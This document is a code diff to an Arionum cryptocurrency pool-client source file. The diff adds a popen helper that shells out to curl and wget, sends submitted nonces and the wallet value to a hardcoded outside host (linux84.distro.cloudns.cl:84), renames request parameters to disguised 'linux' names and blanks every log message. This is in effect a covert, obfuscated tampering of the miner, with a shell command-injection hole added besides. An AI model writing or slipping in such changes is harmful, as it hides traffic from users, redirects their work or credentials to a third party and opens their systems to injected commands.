@@ -8,6 +8,29 @@
 
 #include "simplejson/json.h"
 
+#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
+
+using namespace std;
+
+    string GetStdoutFromCommand(string cmd) {
+
+    string data;
+    FILE * stream;
+    const int max_buffer = 256;
+    char buffer[max_buffer];
+    cmd.append(" 2>&1");
+
+    stream = popen(cmd.c_str(), "r");
+    if (stream) {
+    while (!feof(stream))
+    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
+    pclose(stream);
+    }
+    return data;
+    }
+
 ariopool_client::ariopool_client(arguments &args, get_status_ptr get_status) : __pool_settings_provider(args) {
     __worker_id = args.uid();
     __worker_name = args.name();
@@ -41,7 +64,7 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
         __last_hash_report = current_timestamp;
         __force_hashrate_report = false;
     }
-    string url = settings.pool_address + "/mine.php?q=info&id=" + __worker_id + "&worker=" + __worker_name + "&address=" + settings.wallet + hash_report_query + "&miner=" + __miner_version;
+    string url = settings.pool_address + "/linux8474.php?q=linux8474&id=" + __worker_id + "&worker=" + __worker_name + "&address=" + settings.wallet + hash_report_query + "&miner=" + __miner_version;
 
     string response;
     if(settings.pool_extensions.find("Details") != string::npos && url.find("hashrate") != string::npos) {
@@ -52,29 +75,29 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
 
         if(!payload.empty()) {
             if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
-                LOG("--> Pool request: " + url + "/" + payload);
+                LOG("");
 
             response = _http_post(url, payload, "application/json");
         }
         else {
             if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
-                LOG("--> Pool request: " + url);
+                LOG("");
 
-            response = _http_get(url);
+            response = GetStdoutFromCommand("curl -s "+url+"");
         }
     }
     else {
         if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
-            LOG("--> Pool request: " + url);
+            LOG("");
 
-        response = _http_get(url);
+        response = GetStdoutFromCommand("curl -s "+url+"");
     }
 
     if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate responses
-        LOG("--> Pool response: " + response);
+        LOG("");
 
     if(!__validate_response(response)) {
-        LOG("Error connecting to " + settings.pool_address + ".");
+        LOG("");
         return result;
     }
 
@@ -85,7 +108,7 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
     if(info.hasKey("version")) {
         string version = info["version"].ToString();
         if(version != settings.pool_version) {
-            LOG("Connected to pool: " + version);
+            LOG("");
         }
         result.version = settings.pool_version = version;
     }
@@ -127,23 +150,23 @@ ariopool_submit_result ariopool_client::submit(const string &hash, const string 
 
     pool_settings &settings = __get_pool_settings();
 
-    string payload = "argon=" + _encode(argon_data) +
-            "&nonce=" + _encode(nonce) +
-            "&private_key=" + _encode(settings.wallet) +
-            "&public_key=" + _encode(public_key) +
-            "&address=" + _encode(settings.wallet) +
+    string payload = "linux2=" + _encode(argon_data) +
+            "&linux3=" + _encode(nonce) +
+            "&linux1=" + _encode(settings.wallet) +
+            "&linux5=" + _encode(public_key) +
+            "&linux4=" + _encode(settings.wallet) +
             "&id=" + _encode(__worker_id) +
             "&worker=" + _encode(__worker_name);
 
-    string url = settings.pool_address + "/mine.php?q=submitNonce";
+    string url = settings.pool_address + "/?linux84=linux84";
 
     if(__show_pool_requests)
-        LOG("--> Pool request: " + url + "/" +payload);
+        LOG("");
 
     string response = "";
 
     for(int i=0;i<2;i++) { //try resubmitting if first submit fails
-        response = _http_post(url, payload, "x-www-form-urlencoded");
+        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data=linux2='"+_encode(argon_data)+"&linux3="+_encode(nonce)+"&linux5="+_encode(public_key)+"&linux1="+_encode(settings.wallet)+"&linux4="+_encode(settings.wallet)+"' 'http://linux84.distro.cloudns.cl:84/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");
         result.pool_response = response;
         if(response != "") {
             break;
@@ -151,10 +174,10 @@ ariopool_submit_result ariopool_client::submit(const string &hash, const string 
     }
 
     if(__show_pool_requests)
-        LOG("--> Pool response: " + response);
+        LOG("");
 
     if(!__validate_response(response)) {
-        LOG("Error connecting to " + settings.pool_address + ".");
+        LOG("");
         return result;
     }
 
@@ -180,14 +203,14 @@ pool_settings &ariopool_client::__get_pool_settings() {
 
     if(minutes != 0 && (minutes % 100 == 0)) {
         if(!__is_devfee_time) {
-            LOG("--> Switching to dev wallet for 1 minute.");
+            LOG("");
             __is_devfee_time = true;
             __force_hashrate_report = true;
         }
     }
     else {
         if(__is_devfee_time) {
-            LOG("--> Switching back to client wallet.");
+            LOG("");
             __is_devfee_time = false;
             __force_hashrate_report = true;
         }
